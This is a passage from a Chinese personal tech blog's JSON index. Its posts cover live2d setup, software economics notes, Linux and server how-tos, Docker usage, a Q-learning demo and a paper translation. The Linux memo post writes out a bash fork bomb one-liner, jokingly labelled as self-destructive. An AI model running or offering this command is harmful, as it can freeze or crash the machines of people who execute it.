GenerationType.IDENTITY)","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://waynamigo.github.io/tags/mysql/"}]},{"title":"jekyll加入live2d的模型","slug":"2019-05-14-jekyll加入live2d模型","date":"2019-05-13T16:00:00.000Z","updated":"2019-07-14T10:03:35.142Z","comments":true,"path":"2019/05/14/2019-05-14-jekyll加入live2d模型/","link":"","permalink":"http://waynamigo.github.io/2019/05/14/2019-05-14-jekyll加入live2d模型/","excerpt":"由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下迁hexo了草。","text":"由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下迁hexo了草。 安装hexonpm install hexo-cli 使用hexo初始化一个本地的博客文件夹 hexo init 安装需要的依赖 npm install就可以了 在hexo安装live2d插件1yarn add hexo-helper-live2d 详见 hexo-helper-live2d 在hexo配置一下在config里面加入live2d的配置 12345678910111213141516171819hexo-helper-live2d项目给的配置文件例子live2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 display: superSample: 2 width: 150 height: 300 position: right hOffset: 0 vOffset: -20 mobile: show: true scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 找你要加入的live2d模型（有钱的可以去订做，把widget替换掉。 koharu在这里面live2d-widget-model clone所需要的live2d模型后，还需要在config里面加入一个live2d配置。 配置文件如下（注释是wife还行） 123456789101112#wifelive2d: enable: true pluginModelPath: assets/ model: use: koharu #模板目录，在node_modules里 display: position: right width: 150 height: 300 mobile: show: false 启动hexo，会自动编译生成可用的模型文件目的文件live2d文件夹，编译后的文件目录如下 12_config.yml live2d_models package.json scaffolds themesdb.json node_modules public source 在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了12&lt;script src=\"/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887\"&gt;&lt;/script&gt;&lt;script&gt;L2Dwidget.init(&#123;\"pluginModelPath\":\"assets/\",\"model\":&#123;\"jsonPath\":\"/live2dw/assets/koharu.model.json\"&#125;,\"display\":&#123;\"position\":\"right\",\"width\":150,\"height\":300&#125;,\"mobile\":&#123;\"show\":false&#125;,\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false&#125;);&lt;/script&gt;","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"live2d","slug":"live2d","permalink":"http://waynamigo.github.io/tags/live2d/"}]},{"title":"软件工程经济学","slug":"2019-05-04-软件工程经济学","date":"2019-05-03T16:00:00.000Z","updated":"2019-07-14T10:07:32.951Z","comments":true,"path":"2019/05/04/2019-05-04-软件工程经济学/","link":"","permalink":"http://waynamigo.github.io/2019/05/04/2019-05-04-软件工程经济学/","excerpt":"from 华南理工大学 左保和老师软件项目如何进行融资、分析风险、敏感性因素等","text":"from 华南理工大学 左保和老师软件项目如何进行融资、分析风险、敏感性因素等 软件工程经济学基础总览12345678910requirementdesignconstructure 详细设计和总体设计在design完成，testingmaintenanceconfigure management，软件团队的管理办法management tools and methodengineering processquality 货币的时间成本，举例说明这个概念的重要性1、货币时间成本按利率衡量特定时间内 ，利息/借贷资本 利息计算方法12单利 I = iP N ==&gt; 利率*存款*计息周期数复利 F = P（1+i）^N 掌握的重要概念part1利率、利息额、借贷资本总额通货膨胀率、消费者价格指数（CPI）、生产者价格指数（PPI）利息的计算方法：单利、复利、计息期（一般为年，或换算为年）等值计算的概念和意义（现值、折现率）等额支付（等额本金、等额本息）税收、营业税、增值税、营改增贬值、折旧 工程经济学的概念工程经济学是运用有效的方法对工程各种因素进行评价，确定最佳方案，做出投资决策的学科，的研究对象是工程项目。对软件工程领域来说， 金融学明确目标周期机构商业战略 管理现今流量管理 会计学原理资产对外投资固定资产货币资金收入费用利润 现金流量现金的定义 指企业的库存现金和银行存款，还包括现金等价物，即企业持有的期限短、流动性强、容易转换为已知金额现金、价值变动风险很小的投资等 一项投资被确认为现金等价物必须同时具备四个条件：期限短、流动性强、易于转换为已知金额现金、价值改动风险小。 是企业财力的评价指标之一 现金流量图12345678910现金流入流出|||||_________________| 时间,指财务周期||| 支付方式等额支付 线性梯度支付p=G{}几何梯度支付第二年 = 第一年* (1+G) 通货膨胀纸币的发行量超过了流通中实际需要的数量，多余的部分继续在流通中流转，就会造成通货膨胀（百度百科） 折现衡量现金流量，税收， 税收营业 教育 增值 ###基准收益率与利率的区别基准收益率也被称为基准折现率。区别1：和利率不同，利率是资金利息额与借贷资金额的比率；收益率是投资的回报率，利润占使用平均资金的百分比。区别2：基准收益率是企业或行业或投资者以动态的观点所确定的、可接受的投资项目最低标准的受益水平，由国家发改委和建设部制定。基准利率由中国人民银行制定。区别3：上节讲的通货膨胀、利息等宏观因素是影响利率的主要因素；而对收益率来说，商品的生产率、运维生产率，投资，不确定度、消费者的消费偏好、投资风险、物价变动等因素是主要因素，并且根据每个行业的行情变动相对利率较大。软件行业的基准收益率是15%。 发改委官网、国家统计局官网上找不到数据，在材料《建设项目经济评价方法与参数》上有对各行业经济的各项参数的详细介绍 部分数据参照“北京软件造价评估技术创新联盟”网站的报告，包括2016-2018年，2018中国软件行业基准数据报告 cpi ， spiCPI=EV/AC，SPI=EV/PV cpi 成本绩效指标甘特图 贬值进度计划进度控制指标spi &lt;1 进度落后 =1 按计划进行 &gt;1 超前进行开发者效率 软件项目质量ISO度量 软件质量保证制定推行软件工程质量标准研究 采用各种技术手段控制各种变更制定并执行测试计划按质量标准对软件质量进行度量组织各种技术评审会","categories":[{"name":"软件工程经济学","slug":"软件工程经济学","permalink":"http://waynamigo.github.io/categories/软件工程经济学/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/tags/其他/"}]},{"title":"备忘的一些操作","slug":"2019-04-17-备忘的一些烦人操作","date":"2019-04-16T16:00:00.000Z","updated":"2019-07-14T10:01:50.600Z","comments":true,"path":"2019/04/17/2019-04-17-备忘的一些烦人操作/","link":"","permalink":"http://waynamigo.github.io/2019/04/17/2019-04-17-备忘的一些烦人操作/","excerpt":"包括用linux自带openssl签postfix证书、流媒体证书按网上教程（百度找了九篇都是一样的还都没用，还转载转你🐴呢）找不到之类的问题，最后自己把证书试出来了，见第一部分，博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题；","text":"包括用linux自带openssl签postfix证书、流媒体证书按网上教程（百度找了九篇都是一样的还都没用，还转载转你🐴呢）找不到之类的问题，最后自己把证书试出来了，见第一部分，博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题； 证书ubuntu自带的openssl包含的证书和RSA密钥等，相当于一套封装的加密套件。 based on SSL&amp;TLS 生成常用key的指令如下（很久远了，之前记下的只有几个，以后更新） 如果没有的话可以下载包ca-certificates 123456789101112public:openssl rsa -in rsa_private.key -pubout -out rsa_public.keyprivate ase256加密:openssl genrsa -aes256 -passout pass:111111 -out rsa_aes_private.key 2048签postfix实现加密，关键的两步:由于Thawte_Premium_Server_CA.pem证书失效，在新的cacert包里面更换成thawte_Primary_Root_CA.pemcat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem修改main.cf的smtp_tls_CAfile = /etc/postfix/cacert.pem，使用postmap生成用户名和密码的hash表重新加载/etc/init.d/postfix（postfix服务的jio本）就可以使用了 怪事情，opencv的cvtColor突然不能用，但是服务器上没问题 解决方法找了其他源。。1conda install --channel https://conda.anaconda.org/menpo opencv3 shell以前记的笔记(_ _)12345678开头加一句#!/bin/bash 说明是一个脚本变量不需要声明可以直接用变量取值的话加美元If while中条件注意空格变量赋值不加空格Echo重定向：如果需要变量值和字符串相连，加大括号。没写i自增导致死循环If后一定要写fi代表结束，汇编格式吼啊 一个技巧，似乎是以前在用别人写的caffe库的时候出现了这个问题，忘了报什么错了，不是记得很清楚 12345678910111213141516171819202122 在Linux下编程时，或者说在一个有很多头文件互相 include 的场景中，经常会遇到不清楚一个变量的完整类型定义的情况（因为有用 typedef 封装），从而有可能遇到编译出错。 例如在使用 stat 来读取文件属性的 i-node number 时，查看 stat 的手册，得知这个变量 st_ino 的变量类型是 ino_t，而我们不清楚 ino_t的准确定义究竟是什么。可以用如下方法：声明一个这样的变量即可。#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;int main() &#123; ino_t blah; return 0;&#125;然后运行如下指令：gcc -E test.c | grep ino_t-E 选项的意思是：在预处理过程后结束并输出到标准输出。文档原文如下-E Stop after the preprocessing stage; do not run the compiler proper. The output is in the form of preprocessed source code, which is sent to the standard output. c文件生成的步骤 1C/C++文件经过预处理(preprocessing)、编译(compilation)、汇编(assembly)、和连接(linking)才能变成可执行文件。 查看已经建立的tcp链接数量，包括close_waite ,established,time_wait状态， 不会awk的时候感觉这是个什么东西orz 1netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&apos; 安装lua的时候 readline缺失1安装一下 libreadline-dev，或者readline-dev，版本不一样有哪个装哪个 树莓派摄像头（非dsi口） 可以这样 1mplayer -tv driver=v4l2:width=800:height=700:device=/dev/video1 tv:// python调用的时候使用PiCamera库或者cv库，PiCamera可以测试下能不能用，毕竟两行代码，做视觉还是用cv了 tx云cdn123配置cdn源站信息： 自有源站，waynamigo.github.io回源配置： 回源host，waynamigo.cn 发现使用shadowsocks还行，那个ssr扔了1sudo sslocal -c /etc/shadowsocks/config.json -d start sslocal 直接用apt安装shadowsocks 使用的流媒体搭建12345678910111213git clone https://github.com/arut/nginx-rtmp-module.gitwget http://nginx.org/download/nginx-1.8.1.tar.gz tar -zxvf nginx-1.8.1.tar.gz cd nginx-1.8.1 先安装一下依赖yum install pcre-develyum install zlib zlib-develyum install openssl openssl-devel./configure --prefix=/usr/local/nginx --add-module=../nginx-rtmp-module --with-http_ssl_module make make install /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920212223rtmp &#123; server &#123; listen 1935; #监听的端口 chunk_size 4000; application hls &#123; #rtmp推流请求路径 live on; hls on; hls_path /usr/share/nginx/html/hls; hls_fragment 5s; &#125; &#125; &#125; 修改server模块的location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; git配置多用户.ssh/config 1234Host github.com HostName github.com IdentityFile ~/.ssh/id_rsa_qq User nanamya 1234567cd .git设置本项目的用户名和邮箱git config user.name \"yourname\"git config user.email \"youremail\"如果重设 则：git config --global --unset user.namegit config --global --unset user.email 如果还是8行，检查一下，正常的话会有如下提示，否则会有debug的信息ssh -vT git@github.com 提示Hi waynamigo! You’ve successfully authenticated, but GitHub does not provide shell access. 作死小能手 :() { function :|:&amp; }; :","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"}]},{"title":"docker笔记整理（二）","slug":"2019-03-27-docker笔记二","date":"2019-03-26T16:00:00.000Z","updated":"2019-07-14T10:01:01.114Z","comments":true,"path":"2019/03/27/2019-03-27-docker笔记二/","link":"","permalink":"http://waynamigo.github.io/2019/03/27/2019-03-27-docker笔记二/","excerpt":"咕","text":"咕 C dockerhub ： waynamigo $$ \\left\\{\\begin{array}{c} a_1x+b_1y+c_1z=d_1 \\ a_2x+b_2y+c_2z=d_2 \\ a_3x+b_3y+c_3z=d3 \\end{array} \\right.$$ 公式1\\( \\sqrt{\\frac{n!}{k!(n-k)!}} \\) 2 \\( \\sqrt{\\frac{n!}{k!(n-k)!}} \\) 3 \\( x^2 + y^2 = r^2 \\) Let’s try a first example. Here’s a dummy equation: $$a^2 + b^2 = c^2$$ RUD","categories":[{"name":"Docker","slug":"Docker","permalink":"http://waynamigo.github.io/categories/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://waynamigo.github.io/tags/docker/"}]},{"title":"docker笔记整理（一）","slug":"2019-03-21-docker笔记整理一","date":"2019-03-20T16:00:00.000Z","updated":"2019-07-14T10:01:13.427Z","comments":true,"path":"2019/03/21/2019-03-21-docker笔记整理一/","link":"","permalink":"http://waynamigo.github.io/2019/03/21/2019-03-21-docker笔记整理一/","excerpt":"基本使用方法","text":"基本使用方法 使用docker仓库 首先，docker的一个镜像是由多层组成的，每一层一个id，在pull的时候可以看到 以下面为例，imageID是镜像的唯一id，但是镜像的完整id是第三行的sha256哈希值，使用docker images 指令的时候，默认id的位数显示是截断的，可以后跟参数–no-trunc=true来显示全部 12345REPOSITORY TAG IMAGE IDubuntu latest 94e814e2efa8Digest: sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499从官方下载，默认 docker pull &lt;image&gt;:&lt;tag&gt;如果从第三方下载，需要在仓库前指定完整仓库地址（例如hub.c.163.com/public/&lt;image&gt;:&lt;tag&gt;） 如果感觉DockerHub慢的话，可以使用镜像代理 https://registry.docker-cn.com。 123456/etc/systemd/system/docker.service.d/http_proxy.conf [Service]Environment=\"HTTPS_PROXY=https://registry.docker-cn.com\"然后systemctl daemon-reload，先reload units，重新加载一下配置单元，再重启docker服务systemctlrestart docker 除了docker images，还有一个docker inspect &lt;image&gt;:&lt;tag&gt; 查看详细信息(json) docker history &lt;image&gt;:&lt;tag&gt;查看历史信息 12345678[ &#123; \"Id\": \"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499\", \"RepoTags\": [ \"ubuntu:latest\" ] &#125;] 基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等 docker search搜索镜像，也是按关键字来的。（你搜docker search mysql可以搜到MariaDB docker image prune -f，强删本地垃圾。创建 基于本地已有镜像创建，docker commit，和git格式差不多 123456格式：docker commit -m 'message' -a 'authorname' &lt;changed imageid or name&gt; &lt;yourimage&gt;:&lt;tag&gt;docker commit -m 'add one file' -a 'waynamigo' c4b6b5b3e7d8 myimage:waynamigops:另外两个参数为-c 执行dockerfile，在后面整理-p 提交时暂停容器的进程 基于本地模板导入（只用了OpenVZ提供的一个linux模板搞了一下，准备有时间拿上学期的floppylinux的文件弄一个镜像 1cat &lt;filename&gt; | docker import - &lt;image&gt;:&lt;tag&gt;,后者为自定义的名字，导入成功后会显示镜像id 基于dockerfile创建镜像，下面是一个demo 1234567891011121314FROM centos #指定基镜像 MAINTAINER waynamigo #该镜像维护者的信息（我）COPY jdk1.8.0_79 jdk1.8.0_79 #从centos复制jdk，（竟然没有openjdk。。。还得配置环境变量ADD &lt;localfile&gt; # 跑了一个jar。。ENV JAVA_HOME=/jdk1.8.0_79ENV PATH=$JAVA_HOME/bin:$PATHENV CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarEXPOSE 8080 #开放8080端口，其实不用写，因为jar里面已经把yml的配置打包好了ENTRYPOINT [\"java\",\"-jar\",\"/filename\"] 123docker build -t waynamigo:webapp .生成后就可以创建容器并运行了docker run -p localhost:8080:8080 --name webapp_running waynamigo:webapp 不放心的话可以进去康康123docker run -it waynamigo:webapp# 运行这个docker容器top # 看进程lsof -i:8080 # 或者看端口占用 保存镜像 导出到本地，格式类似gcc++ 1docker save &lt;image&gt;:&lt;tag&gt; -o xxx.tar 如果要重新导入，使用 12docker load -i xxx.tardocker load &lt; xxx.tar 上传镜像 还是git，docker push 1234先上传到本地仓库（误docker tag &lt;image&gt;:&lt;tag&gt; waynamigo/&lt;image&gt;:&lt;tag&gt;然后pushdocker push waynamigo/&lt;image&gt;:&lt;tag&gt;","categories":[{"name":"Docker","slug":"Docker","permalink":"http://waynamigo.github.io/categories/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://waynamigo.github.io/tags/docker/"}]},{"title":"学期项目-begining","slug":"2019-03-06-学期项目启动","date":"2019-03-05T16:00:00.000Z","updated":"2019-07-14T12:19:05.507Z","comments":true,"path":"2019/03/06/2019-03-06-学期项目启动/","link":"","permalink":"http://waynamigo.github.io/2019/03/06/2019-03-06-学期项目启动/","excerpt":"项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容","text":"项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容 Vision12Through image, video recognition, text recognition, thestudents&apos; words and deeds are processed by the system to determine whether it has adverse effects on public civilization. Environment Support Keras 2.0/2.2 Tensorflow 1.2 PytorchMain ReferencesI GET THE set of papers from HEREVIDEO TO TEXTIMAGE CAPTIONGET THE NAME FORM DETAIL F-CNNCVPRTwo-streamThe development of my Action-Recgnization module is based on Two Stream 《Two-StreamConvolutional Networks for Action Recognition in Videos》. Reasons of using Two-stream The Action-Recgnization is developed on the way of Two-Stream recent years,And researchers have come out many papers on IEEE SCI and others.but the main reason is that I did Video caption last year, both of them are Analyzing Video Infomation, I want try other algorithm to finish my project in higher quality(get higher score). ProcedureGraphviz using dot generate this picture12 the basic of Two-Stream is The Fusion of spatiotemporal information in a dual stream network.orThe KEY POINT is the better Fusion of spatial and temporal features The interaction between layers within a single network, such as ResNet/Inception. between dual-stream networks, including the exploration of different fusion methods. It is worth considering the structure of ResNet and connecting the dual-stream network. This project use the second method. Spatial networkIt mainly captures important object features in video frames. Time series networkboth of them : finetune the ImageNet Document-Quality AttributesEach contains: 12345678910.└── Avaliability(Quality Attributes eg.) ├── Scenario ├── Stimulus Source ├── Stimulus ├── Artifact ├── Environment ├── Response ├── Response measure └── Tactics Avaliability Performance Modifiability Usability Security Testability Scenario Can not identify bad behavior The exported files are shown well New demands&amp;Structural optimization Customers want to export statistics file easily and need a reliable data Databases is intruded Unit testing Stimulus Source System dependencies Customers Developers and Customers Customers Attackers Developers Stimulus Can’t solve information of the video Exporting operation Customers Runtime(?) Sql injection&amp;entitlement Unit testing each module Artifact whole system UI system UI DBMS Code Environment Windows/Linux x86_64/32 in Runtime environment Web browser Runtime environment Web browser Firewall&amp;Encryption Runtime environment Response Send a feedback to backend if can’t analyze the video from surveillance cameras;Retry if can’t export the list of score Export statistics files in 10s Extend and modify functions when come out a new demand Provide a easy-operated UI and reliable information Resist intrusion Each module passed the Test Cases Response measure within 5min;within 5s within 10s All modules is extensible and under the control of the evaluation indexs The satisfaction of user Database is protected Developers Tactics Retry Self-test Increase Resource Efficiency Split Module aaa warm backup Limit Non-determinism Project Details This project explores prominent action recognition models with UCF-101 dataset Perfomance of different models are compared and analysis of experiment results are provided To be continued","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://waynamigo.github.io/categories/深度学习/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"}]},{"title":"强化学习DQN简介","slug":"2019-03-02-强化学习初步","date":"2019-03-01T16:00:00.000Z","updated":"2019-07-14T12:18:33.709Z","comments":true,"path":"2019/03/02/2019-03-02-强化学习初步/","link":"","permalink":"http://waynamigo.github.io/2019/03/02/2019-03-02-强化学习初步/","excerpt":"QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自https://blog.csdn.net/qq_16234613/article/details/80268564","text":"QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自https://blog.csdn.net/qq_16234613/article/details/80268564 概念理解1234预设值：首先将图中的每一条边预设reward，目标节点指向自己的邻接边的reward设100，其他设为0Q、R矩阵： 包括状态action和行为state，作为行列环境反馈: 对于每一次的episode （相当于迭代的东西），每一次尝试attemp，会根据反馈进行对网络更新环境更新. 1234567R+r*max_Q(32)基本规则如下：Q表内容为index--state（agent的位置），columns--action(行为集)Q表（记录行为值）的计算规则是每次对于行为集合中的每一个action，对其进行计算、并进行选择。每一次episode，Q表更新一次定义EPSILON的目的是控制贪婪程度，其中，它可以随着时间推移 逐渐增加，贪婪) 主循环：图示 首先要对其评估和更新准则进行确定，代码中表示可以直接定义在一个结构中。 12345678910111213def update_env(S, episode, step_counter): # This is how environment be updated env_list = ['-']*(N_STATES-1) + ['T'] # '---------T' our environment if S == 'terminal': interaction = 'Episode %s: total_steps = %s' % (episode+1, step_counter) print('\\r&#123;&#125;'.format(interaction), end='') time.sleep(2) print('\\r ', end='') else: env_list[S] = 'o' interaction = ''.join(env_list) print('\\r&#123;&#125;'.format(interaction), end='') time.sleep(FRESH_TIME) demo,参考莫烦python的一个例子预先设置的参数，就是上述的预设值，其中gamma参数是作为奖励递减值，作用见后文代码，它是 123456N_STATES = #1维宽度ACTIONS = #动作集合EPSILON = #greedy贪婪值ALPHA = # learning rate 学习率GAMMA = # discount factor 奖励递减值MAX_EPISODES = # maximum episodes 最大回合数 Q表的行和列存储action和state，它的Value 每一次更新就是更新它的行为准则 123456def build_q_table(n_states, actions): table = pd.DataFrame( np.zeros((n_states, len(actions))), columns=actions, ) return table","categories":[{"name":"Reinforcement Learing","slug":"Reinforcement-Learing","permalink":"http://waynamigo.github.io/categories/Reinforcement-Learing/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"DQN","slug":"DQN","permalink":"http://waynamigo.github.io/tags/DQN/"}]},{"title":"《Computer Communications_Incorporating energy and load balance into virtual》翻译","slug":"2019-02-05-Computer Communications_Incorporating energy and load balance into virtual翻译","date":"2019-02-04T16:00:00.000Z","updated":"2019-07-14T09:56:42.380Z","comments":true,"path":"2019/02/05/2019-02-05-Computer Communications_Incorporating energy and load balance into virtual翻译/","link":"","permalink":"http://waynamigo.github.io/2019/02/05/2019-02-05-Computer Communications_Incorporating energy and load balance into virtual翻译/","excerpt":"张老师论文翻译，有些事情搁置了","text":"张老师论文翻译，有些事情搁置了 p1-introductionWith the advancement of science and technology, many Internet end-users have the demand of deploying new protocols or installing new services on the existing network architecture. Unfortunately, the current Internet architecture cannot meet the increasing demands of these end-users, and the architecture of current Internet appears to be ossification. Network virtualization technique has been propounded as one of the important techniques to fend off the Internet ossification. Through the technique of network virtualization, Service Providers (SPs) can provide different services for different users by means of sliceable management of the existing substrate network resources, and can improve the resource utilization of substrate network and reduce the wasting of substrate network resources. Virtual network embedding is the core component of the network virtualization, it concerns mainly on the allocation of substrate resources and it leads to the virtual network embedding algorithm to be a hotspot of the research.Due to the fact that the problem of virtual network embedding is proved to be an NP-hard problem, therefore, domestic and overseas scholars have proposed some of heuristic algorithms to address this issue or carried out the simulation under the small scale of network topology using the optimization tools. As mentioned earlier, the issue of virtual network embedding is a multi-objective optimization problem. It involves how to maximize the revenue of InPs, how to minimize the cost of accommodating virtual network requests, how to minimize the energy consumption of servers and equipment, and how to balance the workload of substrate networks. However, the prior studies concentrated primarily on the maximization of revenue by accommodating more virtual network requests or increasing the network resource utilization through optimizing virtual link mapping solutions. Fortunately,some researchers begin to study the energy-aware and security-aware virtual network embedding algorithms. In the subsequent section, we will introduce these two kinds of virtual network embedding algorithms. In recent years, energy-aware virtual network embedding algorithms [1–5] have received considerable attention because the power consumption of an average data center is the same as 25,000 households [6] and it is becoming the major energy cost of network operators which almostly account for 42% of the total operating costs. In addition, the security vulnerabilities caused by network virtualization technologies have been attracted great attention from researchers. The security-aware virtual network embedding algorithms have been deeply investigated in the literature of [7–11]. The issues of network fragmentation and load balance can affect the acceptance ratio of VN requests and the Quality of Services (QoS) of the networks, and can equally affect the revenue of SPs since some high level customers are willing to pay the extra price for high quality of services.However, these aforementioned algorithms involve two objective optimization. Therefore, there are some room for improvement by consideration more objectives on virtual network embedding algorithms. The main difference between our paper and previous works is that we take into consideration of energy consumption and load balance into virtual network embedding. This involves three objective optimization including revenue/cost, energy consumption and load balance, since our work is on the foundation of the classical heuristic algorithm which is the default consideration of revenue/cost. In our work, we investigated the multi-objective virtual network embedding algorithms,especially studied the energy and load balance aware virtual network embedding algorithm. Specifically, we first incorporate the node resource utilization and node energy consumption into the node ranking method aiming to give a comprehensive node ranking approach during the node mapping process. Then we utilize an improved differentiated pricing strategy with the purpose of selecting the substrate path with the minimum link consumption for virtual links. Finally, we take into account the node resource utilization to balance the node load in the node mapping stage, and adopt the improved differentiated pricing strategy for assigning different weights to different virtual links to balance the link load in the link mapping stage. The main contributions of this paper can be summarized as follows: We introduce a comprehensive node ranking approach based on node available resource, node resource utilization and node energy consumption. The node ranking method not only takes into account the node energy consumption, but also takes the node resource utilization into consideration. We leverage an improved differentiated pricing strategy to set different weights for different substrate links according to their bandwidth resource utilizations with the purpose of balancing the link load of substrate network, and employ the shortest path algorithm aiming at selecting the substrate path with the minimum link consumption for each virtual link from VNRs to perform the link mapping procedure. We conduct extensive simulations and evaluate our proposed algorithm compared with the other state-of-the-art algorithms in terms of the acceptance ratio of VNRs, the long-term average revenue, the revenue to cost ratio, the standard deviation of node resource usage ratio, and the standard deviation of link resource usage ratio. The remainder of the paper is organized as follows. In Section 2, we briefly review the related works that associated with multi-objective virtual network embedding issues. We describe the system model and problem statement in Section 3. In Section 4, we elaborate our proposed algorithm E-LB-VNE in details. Experimental results and analysis are illustrated in Section 5. Section 6 concludes this paper. 翻译随着科学技术的进步，许多互联网终端用户需要在现有网络架构上部署新协议或安装新服务。不幸的是，当前的互联网架构无法满足这些终端用户日益增长的需求，而当前互联网的架构似乎是僵化。网络虚拟化技术已被提出作为抵御互联网僵化的重要技术之一。通过网络虚拟化技术，服务提供商（SP）可以通过现有基板网络资源的可切片管理为不同用户提供不同的服务，可以提高基板网络的资源利用率，减少基板网络资源的浪费。虚拟网络嵌入是网络虚拟化的核心组成部分，它主要关注基板资源的分配，导致虚拟网络嵌入算法成为研究的热点。由于虚拟网络嵌入问题被证明是NP难问题，因此国内外学者提出了一些启发式算法来解决这个问题，或者在小规模的网络拓扑中进行仿真。优化工具。如前所述，虚拟网络嵌入问题是一个多目标优化问题。它涉及如何最大化InP的收入，如何最小化容纳虚拟网络请求的成本，如何最小化服务器和设备的能耗，以及如何平衡基板网络的工作量。然而，先前的研究主要集中在通过优化虚拟链路映射解决方案来容纳更多虚拟网络请求或增加网络资源利用率来最大化收入。幸运的是，一些研究人员开始研究能量感知和安全感知虚拟网络嵌入算法。在接下来的部分中，我们将介绍这两种虚拟网络嵌入算法。 近年来，能量感知虚拟网络嵌入算法[1-5]受到了广泛的关注，因为平均数据中心的功耗与25,000个家庭相同[6]，并且它正成为网络运营商的主要能源成本。几乎占总运营成本的42％。此外，网络虚拟化技术带来的安全漏洞也引起了研究人员的高度重视。在[7-11]的文献中深入研究了安全感知虚拟网络嵌入算法。网络分片和负载均衡的问题会影响VN请求的接受率和网络的服务质量（QoS），并且同样会影响SP的收入，因为一些高级客户愿意支付额外的高价格服务质量。然而，这些上述算法涉及两个客观优化。因此，通过考虑虚拟网络嵌入算法的更多目标，存在一些改进的空间。我们的论文与以前的工作之间的主要区别在于我们将能耗和负载平衡考虑到虚拟网络嵌入中。这包括三个客观优化，包括收入/成本，能源消耗和负载平衡，因为我们的工作是经典启发式算法的基础，这是收入/成本的默认考虑因素。在我们的工作中，我们研究了多目标虚拟网络嵌入算法，特别研究了能量和负载平衡感知虚拟网络嵌入算法。具体来说，我们首先将节点资源利用率和节点能耗纳入节点排序方法，旨在在节点映射过程中提供全面的节点排序方法。然后，我们利用改进的差异化定价策略，目的是选择虚拟链路的最小链路消耗的基板路径。最后，我们考虑节点资源利用率来平衡节点映射阶段的节点负载，并采用改进的差异化定价策略为不同的虚拟链路分配不同的权重，以平衡链路映射阶段的链路负载。 本文的主要贡献可归纳如下：1.我们引入了基于节点可用资源，节点资源利用率和节点能耗的综合节点排序方法。节点排序方法不仅考虑节点能耗，还考虑节点资源利用率。2.我们利用改进的差异化定价策略，根据其带宽资源利用率为不同的基板链路设置不同的权重，以平衡基板网络的链路负载， p2-related worksIn recent years, the problem of virtual network embedding has received considerable attention from domestic and overseas researchers.However, most of previous studies do not consider it to be a multiobjective optimization problem while at most do a tradeoff between two objectives. The main goal of prior work with single objective is to maximize the revenue of SPs by accommodating more virtual network requests and reducing the bandwidth utilization of substrate links [12–16]. The main drawback of these single-objective algorithms is thatthey did not realize the issue of virtual network embedding is a multi-objective problem, since a large amount of energy consumption can lead to reducing the overall revenue for ISPs, high quality of QoS willincrease the extra incomes of ISPs. To address these issues, two-objective virtual network embedding algorithms attract great attention from many researchers. The most representatives of these algorithms with two objectives are energy aware virtual network embedding algorithms, security aware virtual network embedding algorithms, and load balance aware virtual network embedding algorithms. 翻译近年来，虚拟网络嵌入问题受到国内外研究者的广泛关注。然而，大多数先前的研究并不认为它是多目标优化问题，而最多只是在两个目标之间进行权衡。单个目标的先前工作的主要目标是通过容纳更多的虚拟网络请求和降低基板链路的带宽利用来最大化SP的收入[12-16]。这些单目标算法的主要缺点是他们没有意识到虚拟网络嵌入问题是一个多目标问题，因为大量的能耗会导致ISP的整体收入减少，高质量的QoS将会增加ISP的额外收入。为了解决这些问题，双目标虚拟网络嵌入算法引起了许多研究者的极大关注。具有两个目标的这些算法的最多代表是能量感知虚拟网络嵌入算法，安全感知虚拟网络嵌入算法和负载平衡感知虚拟网络嵌入算法。 p2.1-energy aware VNE algorithmsDue to the exponentially growing amount of physical machines for service provisioning in data centers, the energy consumption caused by a large amount of servers has been becoming a crucial issue, and it hasattracted significant attention in recent years.Two approaches with two objectives that heuristic-based algorithm and particle-swarm-optimization-based algorithm are presented in [2], the authors traded off between energy consumption that is consumedby supporting VN requests and revenue that obtained from accommodating VN requests, and proposed an energy cost model and formulated the energy-aware virtual network embedding problem as aninteger linear programming problem. The authors formulated a discrete-time model to capture the concrete values of electricity price to deal with electricity price fluctuation issue, classified the substratenodes into active nodes and inactive nodes, and separated the substrate nodes into host nodes that can be running some computing tasks and router nodes that only perform forwarding tasks so as to furtherquantify the server energy consumption. However, the formulated mathematical model is based on the experimental 